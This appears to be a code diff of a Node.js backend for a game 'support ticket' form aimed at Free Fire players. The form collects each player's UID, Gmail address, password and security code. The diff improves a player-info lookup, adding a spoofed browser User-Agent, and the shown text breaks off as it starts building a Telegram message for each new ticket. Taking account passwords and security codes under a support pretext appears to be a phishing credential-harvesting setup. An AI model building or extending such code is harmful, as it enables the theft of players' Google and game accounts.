@@ -24,7 +24,7 @@ if (!global.persistentStore) {
 
 app.get('/', (req, res) => res.send("Backend Active"));
 
-// ১. টিকিট জমা নেওয়ার API (FF Info API অটো-ফেচ সহ)
+// ১. টিকিট জমা নেওয়ার API (User-Agent ও ফালব্যাক ডাটা পার্সিং সহ)
 app.post('/api/submit-ticket', async (req, res) => {
     const { uid, gmail, password, securityCode, problemType, additionalDetails } = req.body;
     
@@ -32,26 +32,33 @@ app.post('/api/submit-ticket', async (req, res) => {
     let playerLevel = "N/A";
     let playerRegion = "Bangladesh";
 
-    // FF Info API থেকে সরাসরি ডাটা নেওয়ার চেষ্টা
+    // FF Info API থেকে ব্রাউজার হেডারসহ ডাটা ফেচ করা
     try {
-        const ffRes = await axios.get(`https://ffxinfo-ffx.ffxapis.workers.dev/ff-info?uid=${encodeURIComponent(uid)}`, { timeout: 5000 });
-        const source = ffRes.data?.data || ffRes.data || {};
-        const basic = source.basicInfo || source.profileInfo || source || {};
+        const ffRes = await axios.get(`https://ffxinfo-ffx.ffxapis.workers.dev/ff-info?uid=${encodeURIComponent(uid)}`, {
+            headers: {
+                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+                'Accept': 'application/json'
+            },
+            timeout: 6000
+        });
 
-        if (basic.nickname || basic.name) {
-            playerName = basic.nickname || basic.name;
-        }
-        if (basic.level) {
-            playerLevel = typeof basic.level === 'number' ? `Level ${basic.level}` : String(basic.level);
-        }
-        if (basic.region) {
-            playerRegion = basic.region;
-        }
+        const data = ffRes.data;
+        const basic = data?.data?.basicInfo || data?.basicInfo || data?.data || data || {};
+
+        // সম্ভাব্য সব ধরনের ফিল্ড নাম চেক করা
+        const foundName = basic.nickname || basic.name || basic.AccountName || data.nickname || data.name;
+        const foundLevel = basic.level || basic.AccountLevel || data.level;
+        const foundRegion = basic.region || basic.AccountRegion || data.region;
+
+        if (foundName) playerName = foundName;
+        if (foundLevel) playerLevel = typeof foundLevel === 'number' ? `Level ${foundLevel}` : String(foundLevel);
+        if (foundRegion) playerRegion = foundRegion;
+
     } catch (e) {
         console.error("FF Info Fetch Error:", e.message);
     }
 
-    // ব্যাকএন্ড স্টোরে লাইভ ডাটা জমা করা
+    // ব্যাকএন্ড মেমরিতে আপডেট ডাটা রাখা
     global.persistentStore[String(uid)] = {
         status: "Pending",
         name: playerName,
@@ -60,7 +67,7 @@ app.post('/api/submit-ticket', async (req, res) => {
         reason: ""
     };
 
-    // টেলিগ্রামে প্লেয়ার নাম ও লেভেলসহ মেসেজ গঠন
+    // টেলিগ্রাম মেসেজ
     const telegramMessage = `
 📩 *New Support Ticket Submitted!*
 
